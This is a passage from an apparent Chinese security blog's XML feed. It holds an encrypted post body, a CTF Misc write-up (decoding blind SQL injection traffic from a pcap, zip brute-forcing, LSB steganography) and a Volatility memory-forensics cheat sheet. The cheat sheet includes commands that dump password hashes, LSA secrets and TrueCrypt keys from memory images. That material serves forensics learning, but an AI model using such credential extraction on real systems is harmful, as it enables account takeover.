f9065f251f5aff9bd2529b320f7cc216ee024b3dd44978acc92f50d686e1200ebf1f2ca5ca005ac1a16bf29cd89910ce00ccb2129333cfbc0df7da928050a950329e66aee4a12d681ade5fea5ff325d7659da21699d148d8926dcdbd9e14d94389144e7f691cab4aa292ee3709c7772022b424ecd8bbd5c88bc79d415be60feec750dd89968a5744553aac084ac7f1449618815c340c41ae67d31b2a492d32da3b8d2bed684ff70d76e754e1ba120a07f9135bcfc0c468ba308f8bc257cec633a08d1c7d5e8a0f14c6842663ae71d7a5c8f6fbdf792996beed772d7c1a1cf61716299a8ab3c06aa9a8b991eac53657fd1e842a551b45ee333509c62bdbd0386a7edcb2d849c711c49a725bfaa6a16193b3b54691b271f8b0ac21d6ead311f576f0a0bf1c126a65e44543aa8ea90bf01d3b796dbb4aed4704dab7a08e16d49fdd514f96505778f70969f10b89b5d92d4320818e4173bbcc092f7d3596e38e3f7c70158f6a9175edaf5b1a1c63a5f93c3ccad32c0766457c4f70db58d03399d3f76445179ea5be0a02d5260cc6903f3e693c594a6122ceadbbab3da0293c181af18bb7ee2bdc547be5f1325e76aa19910070c03e4f25b2475d7dd55dc78cf68193abdaa5ca3df75a6647be7c23f38be70d8093f069241c1c73feee07dc076e239f2798605afde032fa4a52315508acfd42e848c273028ee04eaec18a942ef9be63308d8063e67cc14c50e84b7210d3e3c0964ea8e12472cbd31d93c7b7cd8108727759a0b085ccca5caf55778f1ef977f69fdf69ea7c1e5dbbb50a78a83777b90b2ed330c2376dd175f97535f8daaa628ef75a10659c0494a98cc2a47826d670e3d3980987ce7a77644140ecb9fc501f73ecfa87e91621bb0fe09edb3de9ab02cf797eb659de256b0f10511cb36d21fcd791db1483d5905ca0c69458f6c4fc89a33e7865c1e9bfe9ae6c345ae98eb9bb0b45c4c91a8a5924e7a87c573633ada26322266253304e85c35b8077b1568f3225324ebf8fa2fcebfe077ede24834a948d1b6c9377ee2cddbc1920bf4e28dac2a9e550502e2cf29fe482b8b5115fae61488cc92518a8b9d2b2daecac491595510376da0d1902c3e274de6c379cdb84dab95e442b7f3ad37e680ae650dca0ed673060d64e94b96e6cc0ebcc134174641adbc5705837d3d06db228772aaa1086acb86f458f95ce66bf4b73267a3653475f4426ba34ee5c8f117e4814767349b7d7cbfb835525dc21a73333d32b9d2592441ef658ad89aecce3b1aeff4b24ad32cee597a7041e115b6813c958ea26df76c23ce2a295e25af685be8f19c47f1bf3b823e8c4fdb9dccbf2e7b0add9b95a7caa35a92cd3b22139448d1eea9103184b0bb029b7ba587186d1021ee3e293b1bcc41b5cbc2ebf2e04fee8b2fdd0e63659d86667edb7c449a8f48c9f1f1009421ca9416a951c45f76182b5efe0ced7983d532789a56d0079f23b0150ef76423a234374f2d20d0ba703064e5f70bb07989a6842990439dddf05abdc99bbbf87481e6ac7a9c4b54e99a2e4ba378b06459ffd3e56cd97607e29eaf37806073b1b734322dfe0344c73518690b03af3f7bdd045c8ec40037d1a0ede53381ef0859b5a87fdcb09071b20f00e4c897f63b583a307d4b518654745151eebebeda910ea222160c51e6fe41ac72defce9f0f4bd1936401f25c2c78e52333e17ebc8b92ad39a3ca1230fded275b628b7d21a42620b67727a7f4355af634f7b23e0ac0f4ef1ff5a77d37a52a87e026d1492811c2264026cab984502a456d05bb89dfdbaf78ff53b8fa8366a5f280466f73228f1e45915af566e32af34112422c1761a2ff4d53429897a8f0e3e6ab726a132fc36632653d9070306587d871c0d9345c04dc6c9cc34f93eff803df836568519e4bcf24cad0fba983f373e77a134d2e10ad42a6f5fb56371f8d56b4abf755c427e84f1fedde253df4b3d9fe122fe1fcd340029d549fb09a515d643114970ce4458878f068efaabc117a623b08b76eeeb6b2fc2519f04915bb0cc83f31483214f5eeaf94546d2263ea9dfc9063ce582ebc9b9f5f95c5345f2653820f63f47d0a0c4aa8dd36c6a9e72c4f8181c2a76b061cadae1b03fd8e5f3d966b80e16543bd6ebe8b49a9013bee2fae6f639773b37999af58dc5936b286e89f39c7df28039660290c456d51f349c6288e3a3d614b3e8eada4a3e87eafc1970cb13025e332cbc9f1aae875fad0f62a5c452f5dedfdd8365a164f30059e32fa763872689224f86818383e7ccd2ab243459f8ff136ad5b2e7cb1967a3558517276bbcab63d50ef3e062a2498242865ede71de3a0573b235fa2efdaa0d0bb0413c811aed131a2da5c71105b1e6a30a3e3f2e85bf90350188281f5e117324e2413350ae29b2bb1ef149dfdbf04e6cf5f5b4f14deee99547ef07814ceaf4b2d092951b3a2293155c8aa15daec7bb4eb587d2a1258ba18ee9f7f06520be6656f8b2e07791083dfb3607cf61d8584275690b8eb49cee29e46d3ea102349b5316f021bebbad32bae298e16e65347d817a226cb205536bcc9700023e03e028968c170397ed8e12c39ea5271af132ccbf132943d9201e875493b5a5a19963994ee94e6b9c06a8ade9be5de25a79b2c70e015a0edaa789cb68901ef9190e72a7f18fe03e9726c7d698afb40842498a02a305568f6b66cbb0cfcbe435834f0e41f26e704b07ff8de75b6038677a222c1d4bea35a9b43d9d6a0c9fa9f279f4ea83b503ffc6f1d21c1b616dc1f03cd4833c1ffa6601e212fbf662f09be9ed6488eb1b2f31061316be1238d5ea26aa995720eafac20c3ab89b2f61da7aee2f61db56460b746e8b516cd5807fa3c8ded95a3062908527173ac29dd4585e44215be1fb89bad15fddea778889fcd9334f23ceb8a31d7232d2349d1db5631eef1b396a6287ca414ce95eea032ff863c699d8b07a3339d0bc603feafa1f694a7fa7073ad4210beacfc08195a9a197fd5e948d0d1eccd4d94e08477fc7f908db58aa3c3206f5526d334cef8cfa91511c6466550980316d8db264540c8b5956a14fe06b2d4d64f45e3fdf32999f143baa9e104f48044c0c822514444e22a302b90d9cef5fece3e1e46984fcfec98a3683d52d1add0c6c589d2b6a4d0d60623268902f76b16d4aa0abc348666263703998e5d837b34c4aa0aaa0c034b6a762a880e47a2e2de3b4271dc1eccc5752217e61e6799294d49afbdcada651efab21330d97aa8379a0ed2dac5cb99934ab33502ccb50a07d1e318dbaac03b07a6247c2bff01cca9f1d8fe4bcd6e73d2a93c720f6f90fe72a64d5be7b2548d22e6dfafef59fe2d0821c86a4182ef7856dd8f554eacc87f1f4506e001f87674e0101adc6d0e2df8d396dbd946d7677ba9b3445c5d25bd6e857b187fd7b01e29ee1d5897c39d1fcad64c64a683cbdb077b752cf5b962cb6313a7756d919bac8798b14b8f6a7e73eb6ddc4b09e8c331fee58fdfa68c27b0596bc9551d10d34343bf672beb169e902469b6ac01120a9c746bbb41c9cba9351cf4b7fea6534a313b37811036051825e8677e864bfc5f94521490b733c4df3a8effc41851c21269be6acd0433df99ee3cf6769c76113e53545363a95ce16814c427bba30558e4036619588026b65c69791eda13a7e947f0bc1aa79fef5b762a6635f7ad3f2d1dd155754fee810c482a714f6e13fd4c7a8ebdcb08db39be45028a7b0d5bd38789157a4fe470a57b49fd021788d48c51ed69945ead4542bf7447d9d4f8ab721faf06e0cde73b0764902306dc230190889f086c061b957abfab21e567575854c3ca5b536d6838afd352e4027531fd26823c67e50e50e6f3e897588a15ae10608ce58dea29d8d8171fc1639284da87a38da45d518b2917466eaa1807a1da925cb9859451009b0b1d19bd5960d3865bcccfa227116a2020b0cf112dad8c1ad94a77c286984316d680764d0ce344ff36a18ec0571b0cd3a33a089c87b4a7042b917454c4228fabcb54ce5983fef0f2e9a0ab0996367ba2b4964518e3df374ffae2f019deb7fa6bce73fb61c8177565b64e88787da22cddb520693da365180a27fd3ce3c1de03279774526d738e51ef78e818e6fb52c099b10fcff83e834aa1e939f04afd8d5720f48e466a8e862c6df0e1f64a102ef66904b190a43c7f827c048717fd60ab768485ad45210df857979acc8077ec8ed73d6fef44057410141257a005316a00021cd70f117b2129fad9c1d3956e41001b12740752e2efcaeda8181021fc5d161de4f768f5f0e84c4fa88c7f45d40510b91e704d14794c41fce376d50639c2db5345692f8e14dc3c9b638a523495d6d1b89ff62b423831295c8b080b4e59301ab3aee70a43a9a223d226e0de5b9ccbb5ff7d6f22a3f55adcefb255df6e1a9a68b5c71f23758e67f66154c70baeb1a16472a3f4d66faeb2bc4d9f76d0925a67ca90a1948317379a9ae91280d7df431b361eaa2687b4a8003a71d6e9b9ce26162ebebcc15788c158abe1deac185ee212fff5d69c56250fc95031cfcbc7f0971ffa7b4b2b2837076e6a1c13a7b173d2723599018be3b541f0bc974180cb2a016542f10d57788495c38df5855d908dcfdc4028eaeaf657afc243a10e3bafc3cd733dc36ed33269e37776c87ae22fd3a37b1c875046ffcfde4881daaad021ff2bd09ac3be2f07d94d8f6b2124a70d67547f29adf9ecabc97f660dcbeb081227d006e94f59569c257584f54d4420784ecd0aee38e8a2bb3065ce2eee4f68419e98034461c626e5fbdd2789640c39f14375d8872c1b86ee1763b0498ace898a5582bbcdb7e516936eae50b3b155928096c0fb31f80de99fa10f2fbab89474f22ae88b3a11d035b31c675d58f7737fd95717ff43a89316f0b9b825ef1a8f97451192ea7b2b06420b3025cd90a65f4e0f21b190833485cf71fee9f02ce5c96ae1161496b69ca12ddfc3ef2bf546e5903eb531ff562bbbda4ae41f8ce542504e9cd0eaa28e72492fb2847c1d8686a59836414b228c78b768da2e6f5a8cea</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-up">      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-up">请联系管理员</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 电子取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第四届“长城杯”铁三初赛Misc方向题解</title>
      <link href="/2023/03/24/t3_2023/"/>
      <url>/2023/03/24/t3_2023/</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="find-the-flag"><a href="#find-the-flag" class="headerlink" title="find_the_flag"></a>find_the_flag</h3><p>流量分析，使用tshark提取</p><p>这里我们需要的数据只有延时盲注的payload，但是wirshark里面有很多数据</p><p>可以-T指定提取json格式的数据</p><p>tshark.exe在wirshark目录下，在该目录下直接打开终端进行提取操作即可</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230331174728316.png" alt="image-20230331174728316"></p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark.exe -r traffic.pcapng -T json&gt; traf2.txt</span><br></pre></td></tr></table></figure></div><p>使用json的好处是我们可以在json格式的数据中查找到详细的数据的字段名，方便后面对数据的处理</p><p>这个方法不止可以用在这里，像2022年国赛的一道键盘流量分析题，键盘的数据并没有放在常规的usb.capdata里，使用json先提取再查看就可以很容易发现是放在usbhid.data里</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230331170222695.png" alt="image-20230331170222695"></p><p>我们只需要的是http.file_data后面的值，因此strings提取出需要的数据</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings traf2.txt | grep http.file_data &gt; 123.txt</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230331170423857.png" alt="image-20230331170423857"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230331170442218.png" alt="image-20230331170442218"></p><p>现在数据还是不太好看，像盲注这种数据量很大的题目我认为对数据的精简十分重要</p><p>因此继续用vscode里面的更改所有匹配项功能，批量操作光标对数据进行简化处理</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230331170636147.png" alt="image-20230331170636147"></p><p>这个延时盲注有几千条，但遵循的仍是先爆库名，再表名，再字段</p><p>我们需要关注的只有最后的步骤就好了，处理好只剩下！&#x3D;的字段：</p><p>现在这里数据已经比较好看了</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230324172042518.png" alt="image-20230324172042518"></p><p>写脚本对!&#x3D;的部分提取</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;./new.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>).readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f)):</span><br><span class="line"></span><br><span class="line">    a=f[i].split(<span class="string">&#x27;!=&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    b=a.split(<span class="string">&#x27;)&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(b)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230324172054521.png" alt="image-20230324172054521"></p><h3 id="需要一些脚本"><a href="#需要一些脚本" class="headerlink" title="需要一些脚本"></a>需要一些脚本</h3><p>给出一堆加密的压缩包，拿几个爆破会发现压缩包的密码是从10000-10126的</p><p>脚本写的不好，数据量并不大，时间有限又没有很合适的脚本，手撸得到全部内容</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230324172148842.png" alt="image-20230324172148842"></p><p>这里给出一堆没见过的文件，但是搜索可以发现</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230331171255981.png" alt="image-20230331171255981"></p><p>这是linux下文件切割命令后产生的文件</p><p>放到kali里合成原来的文件</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230324172222298.png" alt="image-20230324172222298"></p><p>得到一张图片</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230324172238761.png" alt="image-20230324172238761"></p><p>观察通道发现最低通道存在lsb隐写</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230331171445863.png" alt="image-20230331171445863"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230331171505440.png" alt="image-20230331171505440"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230331171520183.png" alt="image-20230331171520183"></p><p>直接提取数据看不出什么有用信息</p><p>结合附件名字叫flag.zip，再加上图片的信息为“flag is not here”</p><p>猜测flag为密钥</p><p>使用cloacked-pixel进行解密得到flag</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 lsb.py extract 123.png 233.txt flag</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230331171722303.png" alt="image-20230331171722303"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230324172423085.png" alt="image-20230324172423085"></p><p>tips:</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cloacked-pixel使用</span><br><span class="line">加密:</span><br><span class="line">python lsb.py hide big.png 1.txt 123456</span><br><span class="line">ps: hide:表示加密模式; big.png:待加密的png图片; 1.txt:存放payload; 123456:加密的密码</span><br><span class="line">解密:</span><br><span class="line">python lsb.py extract big.png-stego.png 3.txt 123456</span><br><span class="line">ps: extract:表示解密模式; big.png-stego.png:待解密的png图片; 3.txt:存放导出的payload; 123456:解密密码</span><br><span class="line">分析:</span><br><span class="line">python lsb.py analyse big.png-stego.png</span><br><span class="line">ps: analyse:表示分析模式; big.png-stego.png:待分析的png图片; 运行后会对图像进行分析，将其分割成块，标记每个块的最低有效位</span><br></pre></td></tr></table></figure></div><h3 id="p-pcapng"><a href="#p-pcapng" class="headerlink" title="p.pcapng"></a>p.pcapng</h3><p>这题不明确它考点是什么，追踪tcp流可以倒着读出flag，逆天题</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230331174112569.png" alt="image-20230331174112569"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>volatility使用总结</title>
      <link href="/2023/02/10/vol/"/>
      <url>/2023/02/10/vol/</url>
      
        <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="volatility2在kali下安装"><a href="#volatility2在kali下安装" class="headerlink" title="volatility2在kali下安装"></a>volatility2在kali下安装</h2><p>配置python和pip的步骤我就先省略了</p><p>volatility2基于python2，我的kali里python与python2.7软链接，python3与python3.8软链接</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/volatilityfoundation/volatility.git</span><br></pre></td></tr></table></figure></div><p>下载后进入文件夹</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></table></figure></div><p>运行提示缺库，安装库函数出现以下错误</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Command errored out with exit status 1: python setup.py egg_info Check the logs for full command output.</span><br></pre></td></tr></table></figure></div><p>原因在于我使用的是中科大的国内镜像源，换成清华源可以解决</p><p>这里提供一种临时方案可以解决以上报错并成功安装</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2.7 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple --upgrade setuptools</span><br></pre></td></tr></table></figure></div><p>安装缺少的库后仍然提示报错</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230208162253943.png" alt="image-20230208162253943"></p><p>可以知道现在libyara.so的位置</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230208162325923.png" alt="image-20230208162325923"></p><p>建立软链接</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /home/d3f4u1t/.local/lib/python2.7/site-packages/usr/lib/libyara.so /usr/lib/libyara.so</span><br></pre></td></tr></table></figure></div><p>安装成功</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230208162429951.png" alt="image-20230208162429951"></p><h2 id="volatility3在kali下安装"><a href="#volatility3在kali下安装" class="headerlink" title="volatility3在kali下安装"></a>volatility3在kali下安装</h2><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/volatilityfoundation/volatility3.git</span><br></pre></td></tr></table></figure></div><p>安装需要的库，这里python的版本最好不要超过3.9，否则运行某些库会报错</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements-minimal.txt</span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure></div><p>安装成功</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230208162813624.png" alt="image-20230208162813624"></p><p>我的kali里存在多个版本python3.x，采用软链接的方式让命令默认为python3.8</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230208162927957.png" alt="image-20230208162927957"></p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/bin/python3.8 /usr/bin/python3 </span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230208163016505.png" alt="image-20230208163016505"></p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="volatility2常用命令"><a href="#volatility2常用命令" class="headerlink" title="volatility2常用命令"></a>volatility2常用命令</h2><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1.解析镜像</span></span><br><span class="line">Volatility -f 文件镜像 imageinfo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> 2.列出进程</span></span><br><span class="line">--profile=xxxx pslist列出进程(pstree</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3.cmd历史命令</span></span><br><span class="line">cmdscan</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4.文件扫描</span></span><br><span class="line">filescan</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">5.c动态链接文件</span></span><br><span class="line">dlllist动态链接文件</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">6.获取内存中的系统密码</span></span><br><span class="line">hashdump</span><br><span class="line">↓</span><br><span class="line">Volatility -f xxx --profile=xxx hashdump -y (system的virtual地址) -s(sam的virtual地址)</span><br><span class="line"></span><br><span class="line">lsadump</span><br><span class="line">x</span><br><span class="line">volatility_2.6_win64_standalone -f xxx --profile=xxx lsadump</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">7.userassist</span></span><br><span class="line">提取内存中记录的当时正在运行的程序有哪些，运行次数以及最后一次运行时间</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">8.查看SID</span></span><br><span class="line">getsids</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">9.恶意软件</span></span><br><span class="line">malfind:用于寻找可能注入到各种进程中的恶意软件</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">10.获取SAM表中的用户</span></span><br><span class="line">printkey:获取SAM表中的用户</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">11.访问记录</span></span><br><span class="line">mftparser:各自文件访问的记录</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">12.时间轴</span></span><br><span class="line">timeliner:时间轴线，时间长度跨度较大</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">13.解析mft命令</span></span><br><span class="line">Volatility -f xxx --profile=xxx mftparser</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">14.导出mft命令</span></span><br><span class="line">Volatility -f xxx --profile=xxx mftparser --output-file=xxx.txt -D mftoutput</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">15.获取truecrypt密钥</span></span><br><span class="line">Volatility -f xxx --profile=xxx truecryptmaster</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">16.获取truecrypt密码信息</span></span><br><span class="line">Volatility -f xxx --profile=xxx mftparser truecryptpassphrase</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">17.导出注册表:</span></span><br><span class="line">全：Volatility -f xxx --profile=xxx dumpregistry --dump-dir=D:\text\</span><br><span class="line">部分：volatility -f 1.raw --profile=Win7SP1x86 hivedump -o 0x93fc41e8(注册表的 virtual 地址) </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">18.扫描&amp;导出文件</span></span><br><span class="line">volatility -f 1.raw --profile=Win7SP1x86 filescan |findstr flag</span><br><span class="line">volatility -f 1.raw --profile=Win7SP1x86 dumpfiles -Q 0x000000003e71e608 --dump-dir=./</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">19.查看内存中的偏移量</span></span><br><span class="line">hivelist</span><br><span class="line">.hivelist查看缓存在内存的注册表 包括地址等信息</span><br><span class="line">常用注册表的值：a.SOFTWARE b.SYSTEM c.ntuser.dat d.SAM(账户密码表)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">20.查看剪切板</span></span><br><span class="line">volatility_2.6_win64_standalone -f 1.vmem --profile=Win7SP1x64 clipboard</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">21.提取内存中的进程</span></span><br><span class="line">volatility_2.6_win64_standalone.exe -f 1.vmem --profile=Win7SP1x64 memdump -p 3720 -D ./</span><br></pre></td></tr></table></figure></div><h2 id="volatility3常用命令"><a href="#volatility3常用命令" class="headerlink" title="volatility3常用命令"></a>volatility3常用命令</h2><p>Volatility3和Volatility2的命令使用以及操作基本相同,但是volatility3中不需要指定profile</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.系统基本信息(windows.info)</span><br><span class="line">2. 进程列表(windows.pstree)</span><br><span class="line">3. 进程命令行参数(windows.cmdline.CmdLine)</span><br><span class="line">4. 服务运行状态(windows.svcscan)</span><br><span class="line">5. 进程环境变量(windows.envars)</span><br><span class="line">6. 动态库列表(windows.dlllist)</span><br><span class="line">7. 扫描进程(windows.psscan)</span><br><span class="line">8. 注册表数据(windows.registry.hivelist)</span><br><span class="line">9.列出缓冲池(windows.bigpools)</span><br><span class="line">10.列出转存文件(windows.dumpfiles)</span><br><span class="line">11.扫描文件(windows.filescan)</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 电子取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 使用技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow 文件上传</title>
      <link href="/2023/02/01/upload/"/>
      <url>/2023/02/01/upload/</url>
      
